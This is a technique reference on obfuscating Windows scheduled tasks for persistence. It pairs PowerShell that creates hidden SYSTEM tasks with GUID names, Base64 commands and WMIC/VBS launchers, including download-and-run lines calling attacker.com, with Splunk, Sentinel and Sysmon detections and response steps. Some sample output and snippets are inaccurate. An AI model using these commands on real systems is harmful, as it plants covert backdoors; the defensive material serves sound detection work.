# [REALWORLD-027]: Scheduled Task Obfuscation

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-027 |
| **MITRE ATT&CK v18.1** | [T1053 - Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) |
| **Tactic** | Persistence / Execution |
| **Platforms** | Windows AD |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025; Windows 10, 11 |
| **Patched In** | N/A (Feature, not vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Scheduled tasks are a native Windows persistence mechanism. Attackers abuse task scheduler to execute malicious code at predefined intervals or system events while evading detection. Obfuscation techniques involve using unusual names (GUID-based names, legitimate-sounding names), placing tasks in non-standard locations, using command-line encoding (Base64, PowerShell encoded commands), and executing payloads through legitimate system binaries (LOLBins). Scheduled task obfuscation hides the malicious intent of the command-line while maintaining persistence through operating system reboots and task scheduler execution.

**Attack Surface:** Windows Task Scheduler, Registry (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache`), XML task definition files, and legitimate system binaries used to execute commands.

**Business Impact:** **Persistent Code Execution with Privilege Escalation.** Obfuscated scheduled tasks can execute with SYSTEM or high-privilege user context, enabling backdoor access, ransomware deployment, or data exfiltration. The obfuscation makes detection difficult, allowing the malicious task to persist for months or years undetected.

**Technical Context:** Task creation takes seconds; obfuscation adds only seconds. Detection likelihood is medium-high with advanced task monitoring. Task persistence survives reboots indefinitely.

### Operational Risk

- **Execution Risk:** Medium (Requires admin or SYSTEM; task creation can be logged but obfuscation evades signature-based detection)
- **Stealth:** High (GUID names and Base64 encoding evade pattern recognition; legitimate binary execution bypasses EDR heuristics)
- **Reversibility:** Yes (Tasks can be deleted via Task Scheduler or registry, but forensic evidence remains in logs)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Windows Server 2022 5.4 | Ensure 'Audit Process Creation' is set to Success and Failure |
| **DISA STIG** | WN10-AU-000575 | Audit Process Creation must be enabled |
| **NIST 800-53** | AU-3 (Content of Audit Records) | Audit events must capture sufficient detail for investigation |
| **GDPR** | Article 32 | Security of processing; monitoring and incident logging |
| **DORA** | Article 9 | Protection, prevention, and incident response measures |
| **NIS2** | Article 21 | Detection capabilities; incident response procedures |
| **ISO 27001** | A.12.4.1 (Event Logging) | Logging of security events for user activities and system events |
| **ISO 27005** | Risk Scenario: "Malicious Code Execution via Scheduled Tasks" | Unauthorized code execution enabling system compromise |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Administrator, SYSTEM, or membership in the Schedule Operators group
- **Required Access:** Local system access (for local tasks) or network access with admin credentials (for remote task creation)
- **Supported Versions:**
  - **Windows:** Server 2016, 2019, 2022, 2025; Windows 10, 11
  - **PowerShell:** Version 5.0+ (for modern task creation cmdlets)
  - **schtasks.exe:** Built-in to all Windows versions
  - **Other Requirements:** Task Scheduler service running (default)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Enumerate Existing Scheduled Tasks

**Objective:** Identify legitimate and suspicious scheduled tasks to understand the existing task landscape.

**Command (List All Tasks):**

```powershell
# Get all scheduled tasks
Get-ScheduledTask | Select-Object TaskName, TaskPath, State, @{Name="NextRunTime"; Expression={$_.Triggers.CimInstanceProperties.Value}} | Format-Table -AutoSize

# Filter for tasks running with SYSTEM privilege
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "SYSTEM"} | Select-Object TaskName, TaskPath, Principal
```

**What to Look For:**

- Tasks with GUID-like names (e.g., `{A1B2C3D4-E5F6-47A8-9B0C-D1E2F3A4B5C6}`)
- Tasks in non-standard paths (e.g., `\Microsoft\Windows\Hidden\*`)
- Tasks with legitimate binary names but unusual arguments
- Tasks executing PowerShell with Base64-encoded commands
- Tasks created recently (within last days/weeks)

**Version Note:** Syntax consistent across Server 2016-2025.

#### Check Task Registry Hive

**Objective:** Examine the Registry for task definitions that may bypass normal enumeration.

**Command:**

```powershell
# Export task registry hive
Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks" | `
    Select-Object PSChildName | `
    ForEach-Object {
        $TaskGuid = $_.PSChildName
        $TaskPath = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$TaskGuid"
        Write-Host "Task GUID: $TaskGuid"
        Write-Host "Path: $($TaskPath.Path)"
        Write-Host "---"
    }
```

**What to Look For:**

- Tasks with suspicious GUIDs not found in normal Task Scheduler enumeration
- Task paths pointing to non-standard locations
- Recently modified registry entries (check last write time)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Create Obfuscated Scheduled Task Using GUID Name

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Create Malicious Scheduled Task with GUID Name

**Objective:** Create a scheduled task with a GUID-like name to evade pattern-based detection.

**Command (PowerShell, as Administrator):**

```powershell
# Generate a GUID for the task name
$TaskGUID = (New-Guid).ToString()
$TaskName = $TaskGUID  # GUID name appears legitimat in listings

# Define the task action (malicious payload)
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\beacon.ps1"

# Define the task trigger (run at system startup or on logon)
$Trigger = New-ScheduledTaskTrigger -AtStartup

# Define the task principal (run as SYSTEM)
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

# Register the task
$Task = Register-ScheduledTask `
    -TaskName $TaskName `
    -Action $Action `
    -Trigger $Trigger `
    -Principal $Principal `
    -Force

Write-Host "Task created with GUID: $TaskName"
```

**Expected Output:**

```
Task created with GUID: a1b2c3d4-e5f6-47a8-9b0c-d1e2f3a4b5c6
```

**What This Means:**

- A new scheduled task has been created with a randomly-generated GUID name
- The task will execute `beacon.ps1` with SYSTEM privileges at system startup
- GUID name blends in with legitimate Windows GUIDs in task listings
- Task is persistent across system reboots

**OpSec & Evasion:**

- GUID names blend in with legitimate Windows task GUIDs
- No obvious malicious keywords in task name
- Hidden PowerShell window (`-WindowStyle Hidden`) minimizes user awareness
- Detection likelihood: Medium (task name GUID may trigger heuristic alerts)

#### Step 2: Verify Task Registration

**Objective:** Confirm the task was created and is scheduled to execute.

**Command:**

```powershell
# Retrieve the created task
$CreatedTask = Get-ScheduledTask -TaskName $TaskName
$CreatedTask | Select-Object TaskName, State, @{Name="NextRunTime"; Expression={$_.Triggers.StartBoundary}}

# View task details
$CreatedTask | Get-ScheduledTaskInfo
```

**Expected Output:**

```
TaskName                     State NextRunTime
--------                     ----- -----------
a1b2c3d4-e5f6-47a8-9b0c-... Ready (will run at next startup)
```

---

### METHOD 2: Create Obfuscated Task Using Base64-Encoded Command

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Encode Malicious PowerShell Command

**Objective:** Encode the malicious command in Base64 to evade command-line detection.

**Command (PowerShell):**

```powershell
# Original malicious command
$MaliciousCommand = @"
    # Download and execute beacon
    $Url = 'https://attacker.com/payload.exe'
    $Output = 'C:\Windows\Temp\svc_host.exe'
    (New-Object System.Net.WebClient).DownloadFile($Url, $Output)
    & $Output
"@

# Convert to Base64
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($MaliciousCommand)
$EncodedCommand = [Convert]::ToBase64String($Bytes)

Write-Host "Encoded Command:"
Write-Host $EncodedCommand
```

**Expected Output:**

```
Encoded Command:
SQBtAHAAb3J0AC1Nb2R1bGUgAFAAIABvAFAAZQBuAFMAUwBMAC8AYwBlAHI0AiAuAC4ALgA=
(Long Base64 string)
```

**What This Means:**

- Original malicious command is now Base64-encoded
- Encoded form bypasses string-matching detection
- PowerShell `-EncodedCommand` flag will execute the decoded payload

#### Step 2: Create Task with Encoded Command

**Objective:** Create a scheduled task using the Base64-encoded command.

**Command (PowerShell):**

```powershell
# Task name (can be GUID or legitimate-sounding)
$TaskName = "SystemMaintenance"

# Create action with encoded command
$EncodedPayload = "SQBtAHAAb3J0AC1Nb2R1bGUgAFAAIABvAFAAZQBuAFMAUwBMAC8AYwBlAHI0AiAuAC4ALgA="
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -EncodedCommand $EncodedPayload"

# Create trigger (daily at 2 AM, less likely to be noticed)
$Trigger = New-ScheduledTaskTrigger -Daily -At "02:00 AM"

# Create principal (run as SYSTEM)
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

# Register task
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force

Write-Host "Obfuscated task created: $TaskName"
```

**Expected Output:**

```
Obfuscated task created: SystemMaintenance
```

**What This Means:**

- Task executes PowerShell with Base64-encoded command daily at 2 AM
- Command is hidden from basic command-line inspection
- Task name appears legitimate ("SystemMaintenance")

#### Step 3: Verify and Hide Task from Visibility

**Objective:** Verify task execution and optionally hide it from standard enumeration.

**Command (Hide Task via Registry):**

```powershell
# Find task GUID in registry
$TaskGUID = (Get-ScheduledTask -TaskName "SystemMaintenance" | Get-ScheduledTaskInfo).TaskPath -replace '\\', '' -replace '\', ''

# Attempt to hide task from Task Scheduler UI (may require additional registry manipulation)
# Note: This requires direct registry modification and may not fully hide the task

# Alternative: Create task in non-standard path
$TaskPath = "\Microsoft\Windows\UpdateTask\"
Register-ScheduledTask -TaskName "UpdateTask" -TaskPath $TaskPath -Action $Action -Trigger $Trigger -Principal $Principal
```

---

### METHOD 3: Create Task Using LOLBin (Living-off-the-Land Binary)

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Create Task Executing via WMIC or MSOXMLLaunchUtils

**Objective:** Use legitimate Windows binaries to execute the malicious payload, evading EDR monitoring.

**Command (Task Using WMIC):**

```powershell
$TaskName = "CleanupScheduler"

# Payload execution via WMIC (less monitored than powershell.exe)
$Action = New-ScheduledTaskAction -Execute "wmic.exe" -Argument 'process call create "powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString(''https://attacker.com/payload.ps1'')"'

$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force

Write-Host "LOLBin task created using WMIC"
```

**Expected Output:**

```
LOLBin task created using WMIC
```

**What This Means:**

- Task execution proxied through WMIC instead of direct PowerShell
- WMIC process creation may bypass process-level EDR rules
- Payload still executes with full malicious intent

**OpSec & Evasion:**

- WMIC is a legitimate Windows utility; its execution may be whitelisted
- Command chain: WMIC → powershell.exe → remote payload
- Detection likelihood: Low-Medium (depends on EDR process chain monitoring)

#### Step 2: Alternative: Use MSOXMLLaunchUtils

**Objective:** Leverage lesser-known Windows components to execute code.

**Command (Task Using MSOXMLLaunchUtils):**

```powershell
$TaskName = "OfficeUpdateTask"

# MSOXMLLaunchUtils is part of Office and can execute arbitrary commands
$Action = New-ScheduledTaskAction -Execute "cscript.exe" -Argument "C:\Windows\Temp\run.vbs"

# Create VBS file with payload
$VBSPayload = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -NoP -W Hidden -C Get-Content C:\Windows\Temp\beacon.ps1 | IEX", 0, False
"@

$VBSPayload | Out-File -FilePath "C:\Windows\Temp\run.vbs" -Force

$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force
```

**Expected Output:** Task created; VBS script placed in `C:\Windows\Temp\run.vbs`

---

## 6. SPLUNK DETECTION RULES

### Rule 1: Scheduled Task Creation with Suspicious Names

**Rule Configuration:**

- **Required Index:** `main`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventID`, `TaskName`, `TaskPath`
- **Alert Threshold:** Any detection
- **Applies To Versions:** Server 2016-2025

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventID=4698 OR EventID=4700
(TaskName LIKE "%-%-%-%-%" OR TaskPath LIKE "%Microsoft\\Windows\\Hidden%")
| stats count by host, User, TaskName, TaskPath, Command
```

**What This Detects:**

- EventID 4698: Scheduled Task Created
- EventID 4700: Scheduled Task Enabled
- Task names with GUID-like patterns (dashes)
- Tasks in non-standard Microsoft\Windows paths

**Manual Configuration Steps:**

1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **+ New Alert**
4. Paste the SPL query
5. Set **Trigger Condition** to: `count > 0`
6. Configure **Action** → **Send Email**
7. Click **Save**

---

### Rule 2: Base64-Encoded PowerShell in Scheduled Tasks

**Rule Configuration:**

- **Required Index:** `main`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventID`, `TaskContent`, `Command`
- **Alert Threshold:** Any detection
- **Applies To Versions:** Server 2016-2025

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventID=4698 OR EventID=4702
(TaskContent LIKE "%EncodedCommand%" OR Command LIKE "%EncodedCommand%")
| stats count by host, User, TaskName, Command
| where count > 0
```

**What This Detects:**

- EventID 4698/4702: Scheduled Task Created/Updated
- TaskContent or Command field contains "EncodedCommand"
- Indicates Base64-encoded PowerShell execution

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Scheduled Task Creation with Suspicious Characteristics

**Rule Configuration:**

- **Required Table:** `SecurityEvent`
- **Required Fields:** `EventID`, `TaskName`, `TaskPath`, `CommandLine`
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Windows Server versions

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4698 or EventID == 4700
| where TaskName matches regex @"^{?[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}}?$"
    or TaskPath contains "Microsoft\\Windows\\Hidden"
    or CommandLine contains "EncodedCommand"
    or CommandLine contains "Base64"
| project TimeGenerated, Computer, Account, TaskName, TaskPath, CommandLine
| summarize count() by Computer, Account, TaskName
```

**What This Detects:**

- Scheduled task creation/enable events with GUID names
- Tasks in hidden/non-standard paths
- Base64-encoded commands
- Aggregates by computer and account

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Scheduled Task Creation`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create** → **Create**

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4698 (Scheduled Task Created)**

- **Log Source:** Security
- **Trigger:** A new scheduled task is registered
- **Filter:** Monitor all new tasks; alert on GUID names or suspicious commands
- **Applies To Versions:** Server 2016+

**Event ID: 4702 (Scheduled Task Updated)**

- **Log Source:** Security
- **Trigger:** A scheduled task is updated
- **Filter:** Monitor for task modifications; alert on payload changes
- **Applies To Versions:** Server 2016+

**Event ID: 4699 (Scheduled Task Deleted)**

- **Log Source:** Security
- **Trigger:** A scheduled task is deleted
- **Filter:** Monitor for cleanup of suspicious tasks
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy**
3. Enable:
   - **Audit Process Creation**: Success and Failure
   - **Audit Other Object Access Events**: Success
4. Run `gpupdate /force`

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Sysmon Config Snippet:**

```xml
<!-- Detect scheduled task creation via schtasks.exe -->
<RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
        <CommandLine condition="contains">schtasks</CommandLine>
        <CommandLine condition="contains">/create</CommandLine>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
        <CommandLine condition="contains">powershell</CommandLine>
        <CommandLine condition="contains">New-ScheduledTask</CommandLine>
    </ProcessCreate>
</RuleGroup>

<!-- Detect LOLBin execution via scheduled tasks -->
<RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
        <CommandLine condition="contains">wmic.exe</CommandLine>
        <CommandLine condition="contains">process call create</CommandLine>
    </ProcessCreate>
</RuleGroup>
```

**Manual Configuration Steps:**

1. Download Sysmon: [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create `sysmon-config.xml` with the XML above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Enable Scheduled Task Audit Logging:** Monitor all scheduled task creation and modification events.

    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
    3. Enable **Audit Other Object Access Events** → Set to **Success and Failure**
    4. Run `gpupdate /force`

    **Manual Steps (PowerShell):**
    ```powershell
    auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable
    ```

*   **Restrict Scheduled Task Creation:** Limit who can create scheduled tasks via Group Policy.

    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **User Rights Assignment**
    3. Find **Create a task** and **Schedule a task**
    4. Edit and remove all users except Administrators
    5. Run `gpupdate /force`

    **Manual Steps (Registry):**
    ```powershell
    # Restrict scheduled task creation to Administrators only
    icacls "C:\Windows\System32\Tasks" /grant:r "BUILTIN\Administrators:F" /inheritance:r
    ```

*   **Block PowerShell EncodedCommand Usage:** Prevent Base64-encoded PowerShell commands via AppLocker or WDAC.

    **Manual Steps (AppLocker):**
    1. Open **Local Security Policy** (gpedit.msc)
    2. Navigate to **Computer Configuration** → **Windows Settings** → **Application Control Policies** → **AppLocker** → **Script Rules**
    3. Click **Create Default Rules**
    4. Create rule to block PowerShell with "EncodedCommand"
    5. Apply and test

### Priority 2: HIGH

*   **Monitor Scheduled Task Execution:** Log all task execution via Sysmon or Windows Event Log.

    **Manual Steps (Windows Event Log):**
    1. Open **Event Viewer** → **Applications and Services Logs** → **Microsoft** → **Windows** → **TaskScheduler** → **Operational**
    2. Enable this log and set **Max Log Size** to at least 2 GB
    3. Set **Archive** to occur monthly

*   **Implement Process Whitelisting:** Block execution of suspicious binaries (WMIC, cscript.exe) in scheduled tasks.

    **Manual Steps (Windows Defender Application Control):**
    1. Create a WDAC policy that blocks WMIC and cscript.exe execution
    2. Deploy via Group Policy
    3. Test before enforcement

### Priority 3: MEDIUM

*   **Limit Task Scheduler Access:** Restrict local and remote access to Task Scheduler.

    **Manual Steps (Task Scheduler DCOM Permissions):**
    1. Open **dcomcnfg.exe**
    2. Navigate to **Component Services** → **Computers** → **My Computer** → **DCOM Config**
    3. Find **Task Scheduler**
    4. Right-click → **Properties** → **Security Tab**
    5. Restrict **Launch** and **Access** permissions to Administrators
    6. Click **Apply** and **OK**

### Validation Command (Verify Fix)

```powershell
# Check audit policy for scheduled task monitoring
auditpol /get /category:"Object Access"

# Verify AppLocker rules are enforced
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# List all scheduled tasks and verify no suspicious ones exist
Get-ScheduledTask | Where-Object {$_.TaskName -like "*{*}*" -or $_.TaskPath -like "*Hidden*"} | Select-Object TaskName, TaskPath
```

**Expected Output (If Secure):**

- Audit policy shows "Other Object Access Events" enabled
- AppLocker rules include blocks for PowerShell with EncodedCommand
- No scheduled tasks with GUID names or in hidden paths

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Process Artifacts:**
    - `schtasks.exe /create` command execution
    - `powershell.exe` with `-EncodedCommand` flag
    - WMIC executing arbitrary commands
    - cscript.exe running VBS payloads

*   **Registry Artifacts:**
    - New entries in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks`
    - Recently modified task paths with GUID names

*   **File Artifacts:**
    - VBS, PS1, or EXE files in `C:\Windows\Temp\` created recently
    - Task XML files in `C:\Windows\System32\Tasks\` with suspicious content

### Forensic Artifacts

*   **Disk:**
    - Security Event Log: `C:\Windows\System32\winevt\Logs\Security.evtx` (EventID 4698, 4702, 4699)
    - Task cache registry: `C:\Windows\System32\config\SOFTWARE` (Task Scheduler keys)
    - Sysmon logs: `C:\ProgramData\Sysmon\` (if Sysmon enabled)

*   **Memory:**
    - Process memory of `svchost.exe` (Task Scheduler service) may contain task details

*   **Cloud:**
    - Not applicable (on-premises only)

### Response Procedures

1.  **Isolate:**
    **Command:**
    ```powershell
    # Disable suspicious scheduled task immediately
    Disable-ScheduledTask -TaskName "{suspicious-task-guid}" -Confirm:$false

    # Or delete the task
    Unregister-ScheduledTask -TaskName "{suspicious-task-guid}" -Confirm:$false
    ```

    **Manual:**
    - Open **Task Scheduler** → Find suspicious task → Right-click → **Disable**

2.  **Collect Evidence:**
    **Command:**
    ```powershell
    # Export Security Event Log
    wevtutil epl Security C:\Evidence\Security.evtx

    # Export Task Scheduler logs
    wevtutil epl "Microsoft-Windows-TaskScheduler/Operational" C:\Evidence\TaskScheduler.evtx

    # Dump task registry
    reg export "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule" C:\Evidence\SchedulerRegistry.reg
    ```

3.  **Remediate:**
    **Command:**
    ```powershell
    # Verify no suspicious tasks remain
    Get-ScheduledTask | Where-Object {$_.TaskName -like "*{*}*"} | Unregister-ScheduledTask -Confirm:$false

    # Restart Task Scheduler service to reload task cache
    Restart-Service -Name "Schedule" -Force
    ```

4.  **Investigate:**
    - Review Event ID 4698 logs to identify task creation user and time
    - Analyze task payload and determine malware family
    - Search for lateral movement or data exfiltration related to task execution

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker gains initial credentials via phishing |
| **2** | **Privilege Escalation** | [PE-TOKEN-001] Token Impersonation | Attacker escalates to local admin |
| **3** | **Persistence - Current Step** | **[REALWORLD-027] Scheduled Task Obfuscation** | **Attacker creates hidden scheduled task for persistent code execution** |
| **4** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Attacker uses stolen credentials to move laterally |
| **5** | **Collection** | [REALWORLD-033] File Exfiltration via Task | Attacker uses scheduled task to exfiltrate data |
| **6** | **Impact** | [REALWORLD-042] Ransomware Execution via Task | Attacker deploys ransomware using the persistent task |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Trickbot Banking Malware

- **Target:** Financial institutions and businesses
- **Timeline:** 2016-Present
- **Technique Status:** Trickbot uses obfuscated scheduled tasks with Base64-encoded PowerShell commands for persistence and lateral movement
- **Impact:** Compromise of 1M+ endpoints; $1B+ in damages
- **Reference:** [Oasis Security Blog - Trickbot Analysis](https://www.oasissecurity.com/trickbot-malware/)

### Example 2: Emotet Botnet

- **Target:** Enterprises and government agencies
- **Timeline:** 2014-2021 (takedown by law enforcement)
- **Technique Status:** Emotet created obfuscated scheduled tasks to maintain persistence and deploy secondary payloads
- **Impact:** Most prevalent malware globally; 1M+ infections
- **Reference:** [CISA Alert on Emotet Takedown](https://www.cisa.gov/news-events/alerts/2021/01/27/emotet-takedown)

---
